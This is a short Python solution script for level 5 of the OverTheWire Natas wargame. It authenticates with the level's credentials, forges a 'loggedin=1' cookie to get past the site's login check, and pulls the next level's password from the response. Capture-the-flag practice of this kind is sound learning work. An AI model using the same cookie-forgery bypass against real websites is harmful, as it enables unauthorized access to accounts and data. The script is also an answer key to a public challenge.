import requests
import re

username = "natas5"
password = "iX6IOfmpN7AYOQGPwtn3fXpbaJVJcHfq"
url = f"http://{username}.natas.labs.overthewire.org/"

session = requests.Session()

response = session.get(url, auth=(username, password), cookies={'loggedin': '1'})

content = response.text

flag = re.findall(r"The password for natas6 is (.*)<", content)[0]

print(flag)